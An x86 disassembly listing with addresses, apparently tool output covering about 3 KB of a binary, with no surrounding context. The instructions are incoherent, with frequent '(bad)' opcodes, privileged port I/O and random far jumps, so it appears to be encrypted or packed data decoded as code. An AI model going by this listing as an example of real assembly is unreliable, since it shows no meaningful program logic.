  414bb1:	and    esi,DWORD PTR ds:0xa4979b8c
  414bb7:	inc    esi
  414bb8:	scas   al,BYTE PTR es:[edi]
  414bb9:	sub    BYTE PTR [ecx-0x4f],bh
  414bbc:	jp     0x414b49
  414bbe:	fdiv   QWORD PTR [eax+0x63d89bde]
  414bc4:	lds    esi,FWORD PTR [ebx+0x1e]
  414bc7:	in     al,dx
  414bc8:	test   BYTE PTR [eax],0x4f
  414bcb:	add    eax,0x385e8de6
  414bd0:	or     BYTE PTR [esi+edi*8],cl
  414bd3:	arpl   WORD PTR [edi+0x5],ax
  414bd6:	push   ebx
  414bd7:	sub    dl,dh
  414bd9:	xor    DWORD PTR [edi+esi*2-0x3a],ebx
  414bdd:	mov    edi,0x5965c680
  414be2:	es aas 
  414be4:	xchg   ecx,eax
  414be5:	pop    edx
  414be6:	fwait
  414be7:	cmp    cl,bl
  414be9:	inc    edi
  414bea:	stos   DWORD PTR es:[edi],eax
  414beb:	ds mov eax,0x4b175880
  414bf1:	bound  eax,QWORD PTR [ebx-0x5f064744]
  414bf7:	or     cl,BYTE PTR [edx]
  414bf9:	jbe    0x414ba7
  414bfb:	jne    0x414c6d
  414bfd:	xor    eax,0x82b37f6a
  414c02:	dec    ebp
  414c03:	bnd ja 0x414c58
  414c06:	add    edx,DWORD PTR [edi+0x13]
  414c09:	xor    esp,DWORD PTR [eax-0x75]
  414c0c:	nop
  414c0d:	xor    al,0x56
  414c0f:	or     al,0x90
  414c11:	clc    
  414c12:	js     0x414bc4
  414c14:	rol    BYTE PTR [eax-0x63acce93],1
  414c1a:	mov    eax,ds:0x110babe2
  414c1f:	or     eax,0xad758644
  414c24:	xlat   BYTE PTR ds:[ebx]
  414c25:	fwait
  414c26:	aad    0x33
  414c28:	ins    BYTE PTR es:[edi],dx
  414c29:	push   DWORD PTR [edx]
  414c2b:	push   0xb6b80016
  414c30:	repz mov dl,0xff
  414c33:	sbb    ebx,edx
  414c35:	mov    DWORD PTR [ebp-0x72],ebx
  414c38:	add    DWORD PTR [ebx],ebp
  414c3a:	into   
  414c3b:	mov    bl,0xf9
  414c3d:	(bad)  
  414c3f:	mov    al,0x8c
  414c41:	sbb    DWORD PTR [edi-0x556129c7],edi
  414c47:	dec    ebx
  414c48:	cmp    bh,ch
  414c4a:	out    0xeb,al
  414c4c:	pop    edx
  414c4d:	aas    
  414c4e:	mov    ds:0x39a3f6bf,al
  414c53:	mov    dh,BYTE PTR [esi-0x63a53561]
  414c59:	jns    0x414c82
  414c5b:	ja     0x414c24
  414c5d:	fdiv   st,st(7)
  414c5f:	add    DWORD PTR [eax+edi*1+0x3c4129c2],ebx
  414c66:	adc    BYTE PTR [eax-0x4a],dl
  414c69:	imul   esi,DWORD PTR [eax],0x52
  414c6c:	fiadd  DWORD PTR [eax-0x6d32f527]
  414c72:	pop    eax
  414c73:	iret   
  414c74:	inc    ebx
  414c75:	cmp    bh,al
  414c77:	or     eax,0x4eaae2b4
  414c7c:	inc    eax
  414c7d:	aas    
  414c7e:	xchg   edi,eax
  414c7f:	mov    ebp,DWORD PTR [esi+eiz*4+0x3d1bda0d]
  414c86:	mov    al,ds:0xbe1e9eb1
  414c8b:	and    eax,0x4f7a00fd
  414c90:	ins    BYTE PTR es:[edi],dx
  414c91:	in     eax,dx
  414c92:	test   BYTE PTR [eax],dl
  414c94:	adc    eax,0x558ea542
  414c99:	out    0x22,al
  414c9b:	(bad)  
  414c9c:	push   eax
  414c9d:	jmp    0xc6437612
  414ca2:	es xchg ah,cl
  414ca5:	add    eax,0x1ba0580d
  414caa:	imul   esi,DWORD PTR [eax],0x7b8f68c8
  414cb0:	push   cs
  414cb1:	jmp    0x69d5:0x7f3f2d93
  414cb8:	pusha  
  414cb9:	je     0x414c7d
  414cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cbc:	sbb    cl,BYTE PTR [edi+0x58f36603]
  414cc2:	inc    esi
  414cc3:	inc    ecx
  414cc4:	mov    ds:0xc9a1f96f,al
  414cc9:	ins    BYTE PTR es:[edi],dx
  414cca:	or     eax,0x91c84d9
  414ccf:	mov    bh,0x15
  414cd1:	leave  
  414cd2:	sub    eax,0x9d851d73
  414cd7:	add    ebx,DWORD PTR [ecx-0x316e5d25]
  414cdd:	jno    0x414d12
  414cdf:	(bad)  
  414ce0:	mov    BYTE PTR [edi],bh
  414ce2:	and    DWORD PTR [ebx],ebx
  414ce4:	xchg   edx,eax
  414ce5:	lock inc dx
  414ce8:	ficomp WORD PTR [ebx-0x4d]
  414ceb:	xor    BYTE PTR [edi],bh
  414ced:	mov    cl,0xd4
  414cef:	xor    ah,cl
  414cf1:	(bad)  
  414cf2:	sbb    DWORD PTR [ecx+0x2b7a1408],edi
  414cf8:	push   0x51
  414cfa:	add    DWORD PTR [esi-0x16],eax
  414cfd:	ret    
  414cfe:	pop    ds
  414cff:	not    bl
  414d01:	aad    0x58
  414d03:	lods   eax,DWORD PTR ds:[esi]
  414d04:	cmp    esi,esp
  414d06:	fistp  DWORD PTR [ebp+0x4b]
  414d09:	out    dx,eax
  414d0a:	cdq    
  414d0b:	retf   0x7360
  414d0e:	mov    BYTE PTR [esi],bh
  414d10:	pop    edx
  414d11:	cmc    
  414d12:	adc    DWORD PTR [edi],0x2df938c1
  414d18:	ror    DWORD PTR [eax+0x36],1
  414d1b:	and    al,0xcb
  414d1d:	or     edx,eax
  414d1f:	xor    al,BYTE PTR [ebp-0x37fb8266]
  414d25:	enter  0x89a1,0xcd
  414d29:	dec    esi
  414d2a:	int3   
  414d2b:	mov    ch,0xcd
  414d2d:	sbb    eax,0x1ee1ac66
  414d32:	pop    ds
  414d33:	inc    edi
  414d34:	and    esi,esi
  414d36:	xchg   DWORD PTR [ecx+edi*2],esp
  414d39:	enter  0xf4a7,0x3b
  414d3d:	ret    
  414d3e:	jge    0x414d53
  414d40:	push   edi
  414d41:	add    BYTE PTR [ebx+0x7ac706a0],0x9c
  414d48:	sbb    eax,DWORD PTR [edx]
  414d4a:	lock test eax,0x533ece68
  414d50:	(bad)  
  414d52:	test   eax,0xd2e32422
  414d57:	loopne 0x414dac
  414d59:	test   ch,0xee
  414d5c:	inc    esp
  414d5d:	in     al,0xa4
  414d5f:	mov    bh,0xb8
  414d61:	dec    esi
  414d62:	pop    esp
  414d63:	fnsetpm(287 only) 
  414d65:	push   ebx
  414d66:	retf   0xacc2
  414d69:	sbb    BYTE PTR [ecx-0x53aa95d7],ch
  414d6f:	stc    
  414d70:	adc    bh,bl
  414d72:	clc    
  414d73:	cmp    al,ah
  414d75:	jne    0x414d9a
  414d77:	scas   eax,DWORD PTR es:[edi]
  414d78:	jge    0x414db7
  414d7a:	cli    
  414d7b:	mov    dl,0xf
  414d7d:	or     BYTE PTR [eax-0x23],dh
  414d80:	dec    ebp
  414d81:	sbb    DWORD PTR [edi],edx
  414d83:	mov    dl,al
  414d85:	and    DWORD PTR ds:0xcae474f5,ebx
  414d8b:	push   0x2f
  414d8d:	or     eax,0x52df7976
  414d92:	pop    es
  414d93:	pop    ebx
  414d94:	xchg   esp,eax
  414d95:	pop    eax
  414d96:	test   eax,0x20de3d2
  414d9b:	or     BYTE PTR [edi],dl
  414d9d:	lods   al,BYTE PTR ds:[esi]
  414d9e:	retf   
  414d9f:	inc    esp
  414da0:	mov    ah,0x7d
  414da2:	mov    esi,0x6904b9d6
  414da7:	xor    BYTE PTR [edx-0x43],al
  414daa:	or     al,0x13
  414dac:	sub    ah,dl
  414dae:	ss mov dl,cl
  414db1:	sahf   
  414db2:	aad    0xa3
  414db4:	xor    eax,0xa0cc50f0
  414db9:	and    BYTE PTR [ecx],cl
  414dbb:	bt     DWORD PTR [edx+ebx*2+0x3473a9ec],0xcd
  414dc4:	or     BYTE PTR [si-0x180f],dh
  414dc9:	cs in  eax,dx
  414dcb:	imul   ebx,DWORD PTR [eax-0x16],0xffffff9e
  414dcf:	mov    eax,ds:0xae4d11da
  414dd4:	mov    DWORD PTR [ecx+ecx*1],edx
  414dd7:	jno    0x414d76
  414dd9:	push   eax
  414dda:	std    
  414ddb:	mov    ebx,0xd557ca68
  414de0:	xchg   ebx,eax
  414de1:	mov    ah,0xa3
  414de3:	mov    ecx,0xc2ed0f79
  414de8:	iret   
  414de9:	call   0xaadf:0xcd16c7ac
  414df0:	das    
  414df1:	stos   DWORD PTR es:[edi],eax
  414df2:	and    al,BYTE PTR ds:0x66e88b47
  414df8:	sub    al,BYTE PTR [ebx+0x52ccc4e5]
  414dfe:	adc    al,0xa2
  414e00:	mov    ds:0x6a581cb7,al
  414e05:	stos   DWORD PTR es:[edi],eax
  414e06:	mov    bl,0xac
  414e08:	xchg   ecx,eax
  414e09:	mov    es,WORD PTR [eax+eax*1]
  414e0c:	das    
  414e0d:	xchg   ecx,ebx
  414e0f:	sub    eax,0x5815f9ad
  414e14:	sub    al,0xeb
  414e16:	push   ecx
  414e17:	inc    esi
  414e18:	sub    DWORD PTR [edx-0x6e826be],esi
  414e1e:	pop    ds
  414e1f:	pusha  
  414e20:	dec    ebp
  414e21:	adc    al,0x1
  414e23:	pop    ss
  414e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e25:	test   BYTE PTR [eax+0x1d805732],bl
  414e2b:	cmp    eax,0x7c511b0c
  414e30:	mov    esi,0x38e7e96
  414e35:	add    BYTE PTR [ebx+0x286303d1],0xa3
  414e3c:	ins    DWORD PTR es:[edi],dx
  414e3d:	inc    edi
  414e3e:	lmsw   WORD PTR [ebp-0x5a1abbb1]
  414e45:	or     ebx,DWORD PTR [ebx+0x6e]
  414e48:	popf   
  414e49:	push   cs
  414e4a:	mov    al,0x1b
  414e4c:	or     esi,DWORD PTR [edx]
  414e4e:	stos   DWORD PTR es:[edi],eax
  414e4f:	mov    esi,0x3944e37a
  414e54:	inc    eax
  414e55:	dec    DWORD PTR [ebp-0x76]
  414e58:	iret   
  414e59:	cld    
  414e5a:	adc    al,0xfa
  414e5c:	jle    0x414eb6
  414e5e:	aad    0xf8
  414e60:	rcr    DWORD PTR [ecx-0x32],1
  414e63:	xor    al,0xd7
  414e65:	rcr    DWORD PTR [ecx+0x79],1
  414e68:	daa    
  414e69:	xor    bl,BYTE PTR [ecx+0x4]
  414e6c:	or     al,0xa5
  414e6e:	adc    eax,0x761a0ef6
  414e73:	ss call 0x459f0ef8
  414e79:	cmp    edx,esi
  414e7b:	jno    0x414e68
  414e7d:	mov    edx,0xc341e2b6
  414e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e83:	out    dx,al
  414e84:	push   ebp
  414e85:	jmp    0xa67b9c40
  414e8a:	and    esp,ebx
  414e8c:	mov    ah,0x9a
  414e8e:	aaa    
  414e8f:	repnz pop ss
  414e91:	out    0x14,al
  414e93:	cwde   
  414e94:	sbb    edi,esp
  414e96:	push   ds
  414e97:	sbb    al,0x3b
  414e99:	pop    ebx
  414e9a:	shl    BYTE PTR [esi],0xad
  414e9d:	lea    edi,[eax+0x2b]
  414ea0:	sbb    bh,BYTE PTR [esi]
  414ea2:	imul   ecx,DWORD PTR [edx-0x75],0x6f
  414ea6:	test   al,0x74
  414ea8:	lds    ebp,FWORD PTR [edi+eiz*4+0x46c3d987]
  414eaf:	jl     0x414eec
  414eb1:	fld    st(1)
  414eb3:	push   ecx
  414eb4:	xchg   edi,eax
  414eb5:	add    dh,BYTE PTR [ecx-0x5d784221]
  414ebb:	scas   al,BYTE PTR es:[edi]
  414ebc:	inc    ebx
  414ebd:	mov    al,0xbb
  414ebf:	pop    ebx
  414ec0:	(bad)  [ecx]
  414ec2:	into   
  414ec3:	xchg   esi,eax
  414ec4:	xor    DWORD PTR [ecx-0x59],esi
  414ec7:	sub    edi,esi
  414ec9:	jmp    0x687d:0x8f684384
  414ed0:	jne    0x414ed6
  414ed2:	inc    edx
  414ed3:	fisubr DWORD PTR ds:0x600bc85e
  414ed9:	stos   DWORD PTR es:[edi],eax
  414eda:	shl    dh,1
  414edc:	mov    WORD PTR [ebx+0xf288785],ss
  414ee2:	cwde   
  414ee3:	or     eax,0x696ff12a
  414ee8:	ins    BYTE PTR es:[edi],dx
  414ee9:	pop    ebp
  414eea:	pop    ss
  414eeb:	test   ch,0x70
  414eee:	rol    ch,cl
  414ef0:	mov    eax,ds:0x7ee3de4a
  414ef5:	xchg   edx,eax
  414ef6:	and    eax,0x89440075
  414efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414efc:	jl     0x414e8b
  414efe:	out    0x25,eax
  414f00:	lds    ebx,FWORD PTR [esi]
  414f02:	aad    0xd4
  414f04:	je     0x414f23
  414f06:	xchg   ebx,ebp
  414f08:	mov    ds:0x73275f3,eax
  414f0d:	xchg   BYTE PTR es:[edx],cl
  414f10:	pop    ss
  414f11:	add    al,0xfc
  414f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f14:	mov    eax,0xfb265d1a
  414f19:	int    0xa2
  414f1b:	inc    ecx
  414f1c:	stc    
  414f1d:	dec    edi
  414f1e:	xor    al,0xdc
  414f20:	dec    edi
  414f21:	jmp    FWORD PTR [esi+0x41662d4b]
  414f27:	jl     0x414f09
  414f29:	call   0x7399:0xf1d4e3f5
  414f30:	mov    bh,0x17
  414f32:	ja     0x414ec3
  414f34:	lahf   
  414f35:	sub    eax,ebx
  414f37:	jg     0x414f1b
  414f39:	cld    
  414f3a:	push   ebp
  414f3b:	icebp  
  414f3c:	dec    esp
  414f3d:	adc    ah,cl
  414f3f:	outs   dx,BYTE PTR ds:[esi]
  414f40:	mov    ah,BYTE PTR ds:0x47b5018e
  414f46:	inc    edi
  414f47:	push   cs
  414f48:	adc    bh,BYTE PTR [eax-0x1906282c]
  414f4e:	push   ebp
  414f4f:	xor    eax,0x937b9e1a
  414f54:	iret   
  414f55:	ret    
  414f56:	jno    0x414f49
  414f58:	pop    edi
  414f59:	in     eax,0x3b
  414f5b:	ror    BYTE PTR [edx+0x7],1
  414f5e:	inc    BYTE PTR [ebx+0x5d]
  414f61:	fs ror esp,cl
  414f64:	cwde   
  414f65:	shr    BYTE PTR ds:0xc211169a,0x61
  414f6c:	mov    al,ds:0x5d2302e3
  414f71:	imul   ebx,esp,0xffffffec
  414f74:	jo     0x414f4b
  414f76:	neg    BYTE PTR [ebx+0xc10a120]
  414f7c:	ds js  0x414f79
  414f7f:	sub    dl,BYTE PTR [edi+0x24ca5c]
  414f85:	std    
  414f86:	sub    ebx,DWORD PTR [ebx]
  414f88:	xchg   edx,eax
  414f89:	mov    al,0x3
  414f8b:	fs ret 
  414f8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f8e:	jge    0x414f32
  414f90:	dec    ecx
  414f91:	pop    ds
  414f92:	jecxz  0x414f86
  414f94:	shl    BYTE PTR [ecx+0x78],1
  414f97:	aas    
  414f98:	fs or  al,0x98
  414f9b:	neg    edx
  414f9d:	lock adc ebp,0xfffffffc
  414fa1:	in     eax,dx
  414fa2:	in     al,0x1
  414fa4:	loop   0x414fb1
  414fa6:	fldlg2 
  414fa8:	and    bh,cl
  414faa:	dec    ch
  414fac:	test   al,0xd2
  414fae:	mov    bh,0xb6
  414fb0:	fwait
  414fb1:	loope  0x414f60
  414fb3:	not    ebx
  414fb5:	mov    edi,0x95e9eb6
  414fba:	fmul   DWORD PTR [edx+eax*4]
  414fbd:	cmc    
  414fbe:	jb     0x414fb1
  414fc0:	xchg   edi,eax
  414fc1:	(bad)
  414fc4:	xor    BYTE PTR ss:[ecx-0x2be1b8ba],0xaf
  414fcc:	add    DWORD PTR [ebx+0x6215770c],esp
  414fd2:	dec    esi
  414fd3:	fldenv [eax]
  414fd5:	jo     0x414f88
  414fd7:	push   es
  414fd8:	adc    DWORD PTR [edi+0x7f4abe31],esp
  414fde:	(bad)  
  414fdf:	fsubr  st,st(0)
  414fe1:	jne    0x414f6b
  414fe3:	dec    ebp
  414fe4:	adc    esi,DWORD PTR [ecx]
  414fe6:	loope  0x414f80
  414fe8:	mov    ah,0x63
  414fea:	sub    al,bl
  414fec:	in     eax,0xd3
  414fee:	cmc    
  414fef:	loopne 0x414fe7
  414ff1:	pop    es
  414ff2:	add    BYTE PTR [edx+0x47bc89c],dl
  414ff8:	stos   DWORD PTR es:[edi],eax
  414ff9:	retf   
  414ffa:	icebp  
  414ffb:	sbb    eax,0xe2b99855
  415000:	retf   
  415001:	fwait
  415002:	sbb    DWORD PTR [edx],ebx
  415004:	sbb    dl,BYTE PTR [ebx+0x28]
  415007:	mov    esi,DWORD PTR [esi+0x6b]
  41500a:	mov    fs,WORD PTR [ebx-0x45a26d4d]
  415010:	scas   al,BYTE PTR es:[edi]
  415011:	pop    ebx
  415012:	push   esp
  415013:	(bad)  
  415014:	fadd   DWORD PTR [esi+0x5942a18f]
  41501a:	das    
  41501b:	leave  
  41501c:	mov    ecx,0x8bcd6e12
  415021:	xlat   BYTE PTR ds:[ebx]
  415022:	inc    edi
  415023:	enter  0x70fd,0x48
  415027:	mov    eax,ds:0x9537d834
  41502c:	fistp  QWORD PTR [edi]
  41502e:	xchg   ebx,eax
  41502f:	dec    ebx
  415030:	addr16 aam 0x53
  415033:	jnp    0x415027
  415035:	inc    edi
  415036:	xchg   ebx,eax
  415037:	dec    ebp
  415038:	jge    0x414ffb
  41503a:	test   eax,0xa0661218
  41503f:	push   esp
  415040:	mov    al,ds:0xcf3e331f
  415045:	mov    dl,0x35
  415047:	cwde   
  415048:	push   esp
  415049:	inc    eax
  41504a:	xchg   esi,eax
  41504b:	leave  
  41504c:	pop    esi
  41504d:	mov    BYTE PTR [edi],ah
  41504f:	sar    BYTE PTR ds:0x6cd84112,cl
  415055:	dec    eax
  415056:	xor    BYTE PTR [ebx],ah
  415058:	lock (bad) 
  41505a:	sub    al,al
  41505c:	push   ebx
  41505d:	stc    
  41505e:	cmp    DWORD PTR [ebp+0xd11b0c0],edx
  415064:	jle    0x414feb
  415066:	mov    es,WORD PTR [eax+0x4]
  415069:	inc    esi
  41506a:	int3   
  41506b:	mov    edi,0xb27d0394
  415070:	inc    edi
  415071:	rcl    DWORD PTR [edi],0x12
  415074:	imul   edx,DWORD PTR [edx+edi*4+0x405669cc],0xffffffc2
  41507c:	dec    ecx
  41507d:	xor    esp,ebp
  41507f:	mov    ah,0xb6
  415081:	lds    ecx,FWORD PTR [ecx]
  415083:	cmp    cl,ah
  415085:	stos   BYTE PTR es:[edi],al
  415086:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415087:	push   edi
  415088:	sub    eax,DWORD PTR [ecx]
  41508a:	enter  0x8930,0xc4
  41508e:	jmp    DWORD PTR [ebx-0x11650ef4]
  415094:	adc    eax,0xc2837715
  415099:	adc    eax,0xe9138ed7
  41509e:	loopne 0x41507a
  4150a0:	out    dx,eax
  4150a1:	outs   dx,BYTE PTR ds:[esi]
  4150a2:	out    0xe7,al
  4150a4:	jmp    0x65bd09e2
  4150a9:	or     al,0x53
  4150ab:	mov    bl,0xa
  4150ad:	popf   
  4150ae:	cli    
  4150af:	stos   BYTE PTR es:[edi],al
  4150b0:	xor    ah,BYTE PTR [esi+0x6ea276fe]
  4150b6:	mov    al,0x29
  4150b8:	test   eax,0x1a5ac7da
  4150bd:	mov    DWORD PTR [edx+0x3e],edx
  4150c0:	into   
  4150c1:	fwait
  4150c2:	mul    BYTE PTR [ecx-0x2172f56d]
  4150c8:	gs out 0x80,eax
  4150cb:	xchg   esi,eax
  4150cc:	iret   
  4150cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150ce:	adc    DWORD PTR [ebx-0x1b],edx
  4150d1:	adc    edi,DWORD PTR [eax+eiz*2+0xb]
  4150d5:	cmp    al,0x62
  4150d7:	xor    edi,DWORD PTR [ebx]
  4150d9:	mov    dh,0x12
  4150db:	es pop edi
  4150dd:	popf   
  4150de:	cmova  eax,ecx
  4150e1:	hlt    
  4150e2:	ror    BYTE PTR [esi-0x5bd997f6],cl
  4150e8:	and    DWORD PTR [ebx+0x5ea91c37],ebx
  4150ee:	jle    0x4150cd
  4150f0:	xchg   BYTE PTR [ecx-0x5efcd70e],cl
  4150f6:	pop    eax
  4150f7:	jae    0x4150f7
  4150f9:	je     0x4150da
  4150fb:	jg     0x41511d
  4150fd:	and    eax,0xd9691c69
  415102:	jb     0x41508a
  415104:	nop
  415105:	in     al,0xb6
  415107:	mov    eax,gs:0x6e77180f
  41510d:	pushf  
  41510e:	in     al,0x8c
  415110:	ins    BYTE PTR es:[edi],dx
  415111:	nop
  415112:	jae    0x415116
  415114:	fld    TBYTE PTR [edi-0x50]
  415117:	add    esp,ecx
  415119:	sbb    esp,ebp
  41511b:	(bad)  
  41511c:	pop    edi
  41511d:	aas    
  41511e:	cwde   
  41511f:	xchg   BYTE PTR [edi+ebx*4-0x6b],ah
  415123:	fwait
  415124:	aas    
  415125:	xor    eax,0x6f3a1242
  41512a:	or     BYTE PTR [edx],dl
  41512c:	inc    esp
  41512d:	jne    0x415118
  41512f:	ins    BYTE PTR es:[edi],dx
  415130:	daa    
  415131:	mov    DWORD PTR fs:[esi+ebp*2],ebp
  415135:	dec    eax
  415136:	adc    eax,0xe60be9ef
  41513b:	shl    DWORD PTR [eax],0xd1
  41513e:	pop    esi
  41513f:	clc    
  415140:	mov    DWORD PTR [edi-0x19],0x44ef5b36
  415147:	addr16 call 0x5c00:0xf8c897cd
  41514f:	push   ecx
  415150:	fsubr  st(0),st
  415152:	push   0x58bebf0e
  415157:	test   al,0x71
  415159:	sbb    BYTE PTR [ebp-0x1c0f0cf6],ch
  41515f:	outs   dx,DWORD PTR ds:[esi]
  415160:	jnp    0x415121
  415162:	xchg   ecx,eax
  415163:	and    al,0x5
  415165:	out    dx,eax
  415166:	jmp    0xae004469
  41516b:	data16 sahf 
  41516d:	push   ebp
  41516e:	jl     0x415138
  415170:	push   esi
  415171:	aam    0x5f
  415173:	inc    edi
  415174:	jp     0x4151ad
  415176:	jp     0x415121
  415178:	out    0x48,al
  41517a:	pop    ebx
  41517b:	sub    DWORD PTR [esi+0x18fe94ef],esi
  415181:	add    edx,DWORD PTR [ecx-0x60c95cf5]
  415187:	fcom   st(3)
  415189:	shl    BYTE PTR [eax+eiz*2+0x38],0x12
  41518e:	out    dx,eax
  41518f:	sub    ebp,esi
  415191:	dec    ebp
  415192:	dec    ebp
  415193:	push   0x81d5f22a
  415198:	inc    ecx
  415199:	push   ecx
  41519a:	inc    esp
  41519b:	enter  0x919a,0x7a
  41519f:	sub    ah,BYTE PTR [ebx+0x18]
  4151a2:	ins    BYTE PTR es:[edi],dx
  4151a3:	das    
  4151a4:	leave  
  4151a5:	fsub   QWORD PTR [esi]
  4151a7:	mov    ecx,0x8eeedc89
  4151ac:	aaa    
  4151ad:	push   ss
  4151ae:	pop    edx
  4151af:	jmp    0x528b:0x86673
  4151b6:	cwde   
  4151b7:	adc    cl,BYTE PTR [eax-0x1bf1d27d]
  4151bd:	add    eax,0xbe198b3e
  4151c2:	mov    ebp,0xee001b6c
  4151c7:	aad    0xd0
  4151c9:	iret   
  4151ca:	cli    
  4151cb:	pop    eax
  4151cc:	ret    
  4151cd:	cmp    ecx,ebx
  4151cf:	sub    ebp,DWORD PTR [ebx]
  4151d1:	fnstsw WORD PTR [edi+edi*4+0x13]
  4151d5:	out    dx,eax
  4151d6:	mov    bl,0x98
  4151d8:	xor    ebx,DWORD PTR [ebx-0x7b]
  4151db:	js     0x41520a
  4151dd:	lahf   
  4151de:	sub    al,0x73
  4151e0:	jmp    0x1cb7:0x82c60a72
  4151e7:	pop    ebx
  4151e8:	icebp  
  4151e9:	mov    cs,WORD PTR [edi-0x5e]
  4151ec:	inc    ebp
  4151ed:	fwait
  4151ee:	ins    BYTE PTR es:[edi],dx
  4151ef:	xor    ebp,DWORD PTR [ebx+0x27]
  4151f2:	sbb    eax,0x21c68049
  4151f7:	jne    0x4a8f01cb
  4151fd:	xchg   al,ch
  4151ff:	retf   0xc7ab
  415202:	dec    ebp
  415203:	push   esp
  415204:	add    ecx,ebp
  415206:	jnp    0x415279
  415208:	xchg   edi,eax
  415209:	or     ebp,DWORD PTR [ecx-0x66]
  41520c:	xchg   edx,eax
  41520d:	in     al,dx
  41520e:	popf   
  41520f:	jmp    0x8979eb89
  415214:	cmp    DWORD PTR [edx-0x3d],eax
  415217:	das    
  415218:	jno    0x415245
  41521a:	xchg   ebx,eax
  41521b:	mov    bh,0x95
  41521d:	add    DWORD PTR [ebx-0x41b32fd5],esp
  415223:	fcom   QWORD PTR [ebp+0x7d]
  415226:	cmp    bh,BYTE PTR [edx-0xb]
  415229:	gs out 0xf8,eax
  41522c:	pop    edi
  41522d:	and    BYTE PTR [ebx],bl
  41522f:	(bad)  
  415230:	dec    esp
  415231:	xor    BYTE PTR [edx-0x1],ah
  415234:	mov    WORD PTR [ebx+0x3dd79210],ss
  41523a:	sub    BYTE PTR [esi-0x38a8501c],cl
  415240:	fbld   TBYTE PTR [esi+0x7b79e8d0]
  415246:	lods   eax,DWORD PTR ds:[esi]
  415247:	mov    edi,0xe10576db
  41524c:	sub    BYTE PTR [edx],bl
  41524e:	add    DWORD PTR [ecx-0x30079f34],esp
  415254:	or     BYTE PTR [ecx+edx*1-0x31],cl
  415258:	or     ebp,ecx
  41525a:	add    DWORD PTR [eax+0x7a279977],esi
  415260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415261:	popf   
  415262:	adc    esp,esp
  415264:	stc    
  415265:	dec    esp
  415266:	or     cx,sp
  415269:	in     al,dx
  41526a:	cs call 0x48f9:0x1a215773
  415272:	loop   0x415293
  415274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415275:	jg     0x415268
  415277:	mov    cl,0x7e
  415279:	adc    eax,0xd0e022de
  41527e:	mov    bh,0x7e
  415280:	or     BYTE PTR [eax+0x58],al
  415283:	cmp    cl,dl
  415285:	xchg   esp,eax
  415286:	add    BYTE PTR [eax+0x73],dh
  415289:	fiadd  WORD PTR [esi]
  41528b:	fld    QWORD PTR [esi-0x4]
  41528e:	add    al,0xe2
  415290:	xchg   edx,eax
  415291:	aam    0x74
  415293:	(bad)  
  415294:	cwde   
  415295:	cmp    DWORD PTR [ebp+0x3d8ba5c9],0x13628095
  41529f:	push   edx
  4152a0:	cmp    eax,0x83398dba
  4152a5:	fiadd  WORD PTR [edx-0x51e688f6]
  4152ab:	mov    ds:0xc8e3c839,eax
  4152b0:	and    BYTE PTR [edx+0x26],al
  4152b3:	arpl   WORD PTR [eax+0x26b3ee6a],bp
  4152b9:	fisttp DWORD PTR [edx-0x5428b8c]
  4152bf:	sbb    eax,0x6daf75a0
  4152c4:	ret    0x6ad1
  4152c7:	mov    esi,edi
  4152c9:	cmc    
  4152ca:	mov    esi,0x41730e42
  4152cf:	xor    eax,0xbee74c4
  4152d4:	push   esi
  4152d5:	lock or BYTE PTR [ebx-0x2804f958],dl
  4152dc:	and    edx,ecx
  4152de:	push   ds
  4152df:	scas   eax,DWORD PTR es:[edi]
  4152e0:	mov    bh,0x17
  4152e2:	xor    al,0x5f
  4152e4:	sbb    al,dh
  4152e6:	out    dx,eax
  4152e7:	je     0x415331
  4152e9:	loopne 0x4152d1
  4152eb:	inc    ecx
  4152ec:	push   esi
  4152ed:	push   0xffffffc2
  4152ef:	pop    es
  4152f0:	ins    DWORD PTR es:[edi],dx
  4152f1:	push   ss
  4152f2:	icebp  
  4152f3:	mov    al,ds:0xe1e71e8
  4152f8:	(bad)  
  4152f9:	sbb    al,0xb0
  4152fb:	hlt    
  4152fc:	mov    DWORD PTR [ebx],0xe840a4f6
  415302:	pop    edi
  415303:	mov    ds:0x338c9405,al
  415308:	fwait
  415309:	ret    0x8781
  41530c:	aaa    
  41530d:	or     al,0x69
  41530f:	pop    ebp
  415310:	cdq    
  415311:	pop    ebx
  415312:	add    cl,BYTE PTR [eax-0x36f44597]
  415318:	fwait
  415319:	(bad)  
  41531a:	mov    WORD PTR [ecx+0x7c179658],gs
  415320:	aaa    
  415321:	sub    al,0xfe
  415323:	push   es
  415324:	cld    
  415325:	or     ecx,DWORD PTR [ecx+0x37]
  415328:	add    bl,BYTE PTR [edx-0xf]
  41532b:	fsub   DWORD PTR [eax+0x48]
  41532e:	sub    DWORD PTR [ebp-0x70],0xee7187f1
  415335:	cwde   
  415336:	ret    0xd2e9
  415339:	out    0x3,eax
  41533b:	in     eax,dx
  41533c:	mov    dl,0xc0
  41533e:	(bad)  
  41533f:	int    0xa7
  415341:	test   al,0x2d
  415343:	imul   edi,DWORD PTR [ebp-0x69d456e0],0x64
  41534a:	fist   WORD PTR [eax+0x3f]
  41534d:	pop    ebp
  41534e:	movups xmm2,xmm7
  415351:	xor    esp,eax
  415353:	fsubr  QWORD PTR [ecx+0x37dee535]
  415359:	lods   al,BYTE PTR ds:[esi]
  41535a:	aad    0xaa
  41535c:	dec    ebp
  41535d:	and    eax,0xec50755f
  415362:	sbb    ebx,DWORD PTR [ecx-0x60054351]
  415368:	adc    eax,0xa58242bc
  41536d:	mov    ecx,0xb5018617
  415372:	ss dec edx
  415374:	xchg   BYTE PTR [ecx+0x20960e02],bl
  41537a:	lahf   
  41537b:	ins    DWORD PTR es:[edi],dx
  41537c:	adc    ebp,DWORD PTR [eax-0x724a78a4]
  415382:	fidiv  WORD PTR [ecx-0x40c6da70]
  415388:	imul   esp,DWORD PTR [esi+ebx*4],0xffffff83
  41538c:	rol    bh,cl
  41538e:	jmp    0x3a73:0x8a4925ef
  415395:	xchg   BYTE PTR [edi-0x3c],ah
  415398:	cmp    DWORD PTR [ebx+edi*1+0x5b],ebp
  41539c:	fs call 0x6e11:0x1077524c
  4153a4:	inc    edi
